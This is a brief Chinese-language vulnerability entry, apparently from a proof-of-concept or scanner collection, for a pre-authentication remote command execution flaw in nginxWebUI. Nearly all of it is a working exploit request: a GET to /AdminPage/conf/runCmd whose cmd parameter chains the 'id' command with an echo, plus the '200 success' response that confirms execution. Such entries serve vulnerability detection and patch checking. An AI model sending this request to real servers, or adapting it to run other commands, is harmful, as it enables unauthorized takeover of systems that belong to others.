# nginxWebUI前台远程命令执行漏洞

nginxWebUI ｜ 命令执行 ｜ —
- **请求**：`GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1`
- **响应特征**：200 success